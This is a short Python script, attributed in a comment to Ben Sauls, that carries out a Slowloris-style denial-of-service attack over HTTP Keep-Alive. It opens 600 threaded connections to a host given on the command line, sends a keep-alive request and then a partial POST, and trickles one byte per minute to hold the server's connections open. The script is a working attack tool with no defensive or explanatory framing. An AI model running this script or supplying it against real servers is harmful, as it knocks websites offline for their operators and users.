#!/usr/bin/python
# A Slowloris style attack delivered via HTTP Keep-Alives
#
# Ben Sauls

import sys, socket, time, threading as th, os

# Defines:
contlen = 10

kaopen = "GET / HTTP/1.1\r\nHost: kaloris.omnom\r\nUser-Agent: bonk!\r\nConnection: Keep-Alive\r\n\r\n"

msgstart = "POST /index.php HTTP/1.1\r\nHost: slowfox.com\r\nContent-Length: 900\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\n"

class clith(th.Thread):
	def run(self):
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.setsockopt(socket.SOL_TCP, socket.TCP_NODELAY, 1)
		s.connect((sys.argv[1], 80))
		s.send(kaopen)
		time.sleep(.5) # This is necessary to prevent Nagle-like behavior. Surprisingly NODELAY did _not_ do the trick.
		s.send(msgstart)
		for b in range(10):
			s.send("a")
			time.sleep(60)
		s.close()

for x in xrange(600):
	clith().start()
	print "."+str(x)+"."
